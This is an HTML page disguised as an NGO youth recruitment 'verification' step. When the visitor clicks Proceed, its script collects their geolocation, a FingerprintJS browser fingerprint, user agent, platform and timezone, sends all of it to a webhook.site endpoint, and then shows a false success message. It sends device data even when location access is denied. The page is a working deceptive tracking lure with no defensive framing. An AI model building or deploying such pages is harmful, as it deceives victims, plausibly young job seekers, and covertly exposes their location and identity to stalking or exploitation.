<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>NGO recruitment process: Youth Incentive</title>
  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 100px;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <h1>NGO Youth Incentive Recruitment</h1>
  <p>Click below to proceed to verification process</p>
  <button onclick="startProcess()">Proceed</button>

  <script>
    let fingerprintData = null;

    // Initialize FingerprintJS on page load
    const fpPromise = FingerprintJS.load();

    fpPromise.then(fp => {
      fp.get().then(result => {
        fingerprintData = result;
      });
    });

    function sendData(locationData) {
      const formData = new FormData();
      formData.append("latitude", locationData.latitude);
      formData.append("longitude", locationData.longitude);
      formData.append("accuracy", locationData.accuracy);
      formData.append("fingerprint", fingerprintData.visitorId);
      formData.append("userAgent", navigator.userAgent);
      formData.append("platform", navigator.platform);
      formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);

      fetch("https://webhook.site/b1218c8c-c615-4d0d-8173-5db4f8f397c0", {
        method: "POST",
        body: formData
      });
    }

    function startProcess() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          };

          console.log("Got location:", locationData);
          sendData(locationData);
          alert("Verification completed successfully. Thank you!");

        }, function(error) {
          console.error("Error occurred:", error);
          sendData({
            latitude: null,
            longitude: null,
            accuracy: null
          });
          alert("Verification failed: Unable to access location.");
        });
      } else {
        alert("Geolocation is not supported by this browser.");
      }
    }
  </script>

</body>
</html>
